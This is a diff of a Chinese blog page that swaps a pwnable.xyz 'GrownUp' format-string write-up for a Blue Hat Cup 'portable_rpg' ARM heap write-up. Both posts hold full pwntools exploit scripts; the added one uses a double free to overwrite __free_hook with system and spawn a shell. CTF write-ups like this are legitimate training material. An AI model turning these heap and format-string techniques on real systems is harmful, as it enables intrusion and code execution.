@@ -3,7 +3,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>pwnable.xyz GrownUp WriteUp - 广莫之野</title>
+  <title>蓝帽杯初赛writeup - 广莫之野</title>
   <meta charset="UTF-8">
   <meta name="description" content>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -11,23 +11,18 @@
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta name="description" content="pwnable.xyz 上的GrownUp的WriteUp。">
+  <meta name="description" content="蓝帽杯初赛 portable_rpg wp">
 <meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.xyz GrownUp WriteUp">
-<meta property="og:url" content="http://shiroinu.top/2019/09/12/grownup/index.html">
+<meta property="og:title" content="蓝帽杯初赛writeup">
+<meta property="og:url" content="http://shiroinu.top/2021/04/29/lanmaobei-wp/index.html">
 <meta property="og:site_name" content="广莫之野">
-<meta property="og:description" content="pwnable.xyz 上的GrownUp的WriteUp。">
+<meta property="og:description" content="蓝帽杯初赛 portable_rpg wp">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/wQjiYqFezdTZ35o.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/5YvpDJyMcxkes3a.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/pOMIb1GfBEog3FQ.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/w6KPeLyriD2tmOV.png">
-<meta property="og:updated_time" content="2019-09-12T11:58:58.728Z">
+<meta property="og:updated_time" content="2021-04-29T10:05:00.766Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.xyz GrownUp WriteUp">
-<meta name="twitter:description" content="pwnable.xyz 上的GrownUp的WriteUp。">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/12/wQjiYqFezdTZ35o.png">
+<meta name="twitter:title" content="蓝帽杯初赛writeup">
+<meta name="twitter:description" content="蓝帽杯初赛 portable_rpg wp">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
@@ -35,7 +30,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1619691636355">
+  <link rel="stylesheet" href="/css/style.css?v=1619691636260">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -136,75 +131,116 @@
         
             <img src="/images/back1.png">
         
-        <h1>pwnable.xyz GrownUp WriteUp</h1>
+        <h1>蓝帽杯初赛writeup</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月12日</a>
-    <a><i class="nexmoefont icon-areachart"></i>532 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 2 分钟</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年04月29日</a>
+    <a><i class="nexmoefont icon-areachart"></i>900 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 4 分钟</a>
     
     
       <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
     
   </div>
   <article>
-    <p>pwnable.xyz 上的GrownUp的WriteUp。</p>
+    <p>蓝帽杯初赛 portable_rpg wp</p>
 <a id="more"></a>
+<p>arm架构的题目</p>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>漏洞点在于add的时候如果选择的职业不为123中的一个,那么就只会malloc0x20的player chunk且不对chunk中的值进行操作,而不会去malloc name chunk<br>因此可以把name chunk中对应打败巨龙的count设成1,free掉之后再malloc出来,那么对应的player就可以show了.<br>libc版本是2.26</p>
+<pre><code class="bash">strings ./libc.so.6 | grep &quot;GNU&quot;
+GNU C Library (Buildroot) stable release version 2.26, by Roland McGrath et al.
+Compiled by GNU CC version 6.4.0.
+        GNU Libidn by Simon Josefsson</code></pre>
+<p>同时因为malloc的时候不会对其中的值有操作,那么如果本来fd字段有tcache链表指针(对应name_ptr字段),那么如果再将其free就可以达成doublefree</p>
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>arm最麻烦的就是调试,首先上网下2.26的libc<br><a href="https://rpmfind.net/linux/RPM/opensuse/ports/updates/15.2/armv7hl/glibc-2.26-lp152.26.6.1.armv7hl.html" target="_blank" rel="noopener">找了半天只找到这个</a><br>然后用</p>
+<pre><code class="bash">rpm2cpio *.rpm| cpio -div</code></pre>
+<p>解包,之后把lib文件夹里面的libc-2.26.so和ld-2.26.so拖到题目文件夹下<br>这里有个坑点,解包出来的libc里面有libc文件和符号链接,符号链接是不能直接复制进虚拟机的,否则会直接强制关机,原因未知,可以用tar打个包再拖进去,进去解压<br>然后</p>
+<pre><code class="bash">qemu-arm -g 1234 -L ./ ./protable</code></pre>
+<p>如果提示找不到<code>ld-linux-armhf.so.3</code>,那么就<code>mv ld-2.26.so ld-linux-armhf.so.3</code><br><code>libc.so.6</code>同样,缺什么就重命名什么.<br>另外新开一个终端,</p>
+<pre><code class="bash">gdb-multiarch ./protable -q
+pwndbg&gt; set architecture arm
+pwndbg&gt; target remote localhost:1234</code></pre>
+<p>就可以调试了</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="python">from pwn import *
 
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/wQjiYqFezdTZ35o.png" alt="Markdown"></p>
-<p>一开始，先用shift+F12发现flag字符串，赶忙提交后发现不对</p>
-<p><img src="https://i.loli.net/2019/09/12/5YvpDJyMcxkes3a.png" alt="Markdown"></p>
-<p>实际上是提示了我们服务器端的flag地址是0x601080</p>
-<p>开始正经做题，似乎难以下手，但是注意到<code>printf(qword_601160, usr)</code>这一行可能有格式化字符串漏洞。</p>
-<p>在gdb中发现<code>qword_601160</code>的值为0x601168</p>
-<p><img src="https://i.loli.net/2019/09/12/pOMIb1GfBEog3FQ.png" alt="Markdown"></p>
-<p>而<code>qword_601160</code>和<code>usr</code>的距离是0x80 = 128</p>
-<pre><code>read(0, src, 0x80uLL)
-strcpy(usr, src);</code></pre><p>这两行乍一看也没有问题</p>
-<p><em>关键</em>  ：strcpy()函数会在复制结束后在目标字符串后添加结束符<code>/x00</code> ；read()则不会。</p>
-<p>由此，如果我们恰好对src输入128个字符，这样最后一个被添加到末尾的<code>/x00</code>就会溢出到0x601160，并且由于小端序，会覆盖原来的<code>/x68</code>，这样qword_601160的值就会被改为0x601100，是usr+32的地址，我们就可以利用格式化字符串漏洞泄露栈中内容了。如果我们之前曾经把flag的地址输入栈中，那么我们就可以用<code>%s</code>将其输出.</p>
-<pre><code class="python">from pwn import * 
 context.log_level = &#39;DEBUG&#39;
-sh = process(&#39;./GrownUpRedist&#39;)
-flag = 0x601080
-payload = &#39;&#39;
-payload += &#39;y&#39; * 8 + p64(flag)
-sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)
-sh.send(payload)
-payload = &#39;&#39;
-payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p &#39;
+context.arch = &#39;arm&#39;
+sh = remote(&quot;8.140.177.7&quot;, &quot;14242&quot;)
+# sh = process([&#39;qemu-arm&#39;,&#39;-g&#39;,&#39;1234&#39;,&#39;-L&#39;,&#39;./&#39;,&#39;./protable&#39;])
+libc = ELF(&#39;./libc.so.6&#39;)
+# sh.recvuntil(&#39;&gt;&gt; &#39;,timeout=1)
+text_local = 0xf6fed000
+libc_local = 0xF6640000
+# pause()
+# pwnlib.qemu.user_path(arch=&#39;arm&#39;)
+# pwnlib.qemu.ld_prefix(arch=&#39;arm&#39;)
+# gdb.attach(sh)
+def create(job, size, name):
+    sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+    sh.sendlineafter(&quot;&gt;&gt; &quot;, str(job))
+    sh.sendlineafter(&quot;name size?\n&quot;, str(size))
+    sh.sendafter(&quot;user name?\n&quot;, name)
 
-length = len(payload)
-payload += &#39;A&#39; * (128 - length)
+def delete(index):
+    sh.sendlineafter(&quot;&gt;&gt; &quot;, str(2))
+    sh.sendlineafter(&quot;index?\n&quot;, str(index))
 
-sh.recvuntil(&#39;Name: &#39;)
-sh.sendline(payload)
-print(sh.recvall())
-sh.interactive()</code></pre>
-<p>在试运行时发现</p>
-<p><img src="https://i.loli.net/2019/09/12/w6KPeLyriD2tmOV.png" alt="Markdown"></p>
-<p>第九个泄露的地址为flag地址0x601080，因此将脚本中的对应位置修改为<code>%s</code>即可得flag。</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8
-from pwn import * 
-context.log_level = &#39;DEBUG&#39;
-#sh = process(&#39;./GrownUpRedist&#39;)
-sh = remote(&#39;svc.pwnable.xyz&#39;,30004)
-flag = 0x601080
-payload = &#39;&#39;
-payload += &#39;y&#39; * 8 + p64(flag)
-sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)
-sh.send(payload)
-#这里如果是sendline()就会报错 原因不明
-payload = &#39;&#39;
-payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%s,%p,%p,%p,%p,%p,%p &#39;
-#第九个位置如果用%p可以见到0x601080 就是flag的地址了 之后改成%s输出flag
-length = len(payload)
-payload += &#39;A&#39; * (128 - length)
-#payload.ljust(128,&#39;A&#39;)
-#print(payload)
-sh.recvuntil(&#39;Name: &#39;)
-sh.sendline(payload)
-print(sh.recvall())
+def show(index):
+    sh.sendlineafter(&quot;&gt;&gt; &quot;, str(3))
+    sh.sendlineafter(&quot;index?\n&quot;, str(index))
+
+
+create(1, 0x20, &quot;2333&quot; + p32(0x80) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(1) + p32(1))
+create(1, 0x20, &quot;2333&quot; + p32(0x80) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(1) + p32(1))
+create(1, 0x400, &quot;2333&quot; + p32(0x80) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(1) + p32(1))
+create(1, 0x400, &#39;/bin/sh\x00&#39;)
+delete(2)
+delete(1)
+delete(0)
+
+sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+sh.sendlineafter(&quot;&gt;&gt; &quot;, str(0)) #0
+
+sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+sh.sendlineafter(&quot;&gt;&gt; &quot;, str(0)) #1
+
+show(1)
+sh.recvuntil(&quot;player name: &quot;)
+heap_base = u32(sh.recv(4)) - 0x1C8
+log.info(&quot;heap_base = &quot; + hex(heap_base))
+libc_addr = heap_base + 0x218
+
+delete(1)
+sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+sh.sendlineafter(&quot;&gt;&gt; &quot;, str(0)) #1
+create(1,0x20,p32(libc_addr) + p32(0x80) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(1) + p32(1))
+show(2)
+sh.recvuntil(&quot;player name: &quot;)
+# libc_base =u32(sh.recv(4)) - 0x156654
+libc_base = u32(sh.recv(4)) - 0x13a828
+
+log.success(&#39;libc_base = &#39; + hex(libc_base))
+
+delete(1)
+sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+sh.sendlineafter(&quot;&gt;&gt; &quot;, str(0)) #1
+# create(1,0x20,p32(libc_base + 0x13B768) + p32(0x80) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(1) + p32(1))
+create(1,0x20,p32(libc_base + libc.symbols[&#39;__free_hook&#39;]) + p32(0x80) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(0x70000000) + p32(1) + p32(1))
+
+# sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+# sh.sendlineafter(&quot;&gt;&gt; &quot;, str(0))
+create(1,0x20,p32(libc_base + libc.symbols[&#39;system&#39;]))
+# sh.sendlineafter(&quot;&gt;&gt; &quot;, str(4))
+# sh.sendlineafter(&quot;index?&quot;, str(1))
+# sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+# sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+# sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+# sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+# sh.sendlineafter(&quot;&gt;&gt; &quot;, str(1))
+# sh.sendafter(&#39;change it?[y/n]&#39;,&#39;y\x00&#39;)
+
+
+
 sh.interactive()</code></pre>
 
   </article>
@@ -244,7 +280,7 @@ sh.interactive()</code></pre>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1619691636362"></script>
+<script src="/js/app.js?v=1619691636267"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
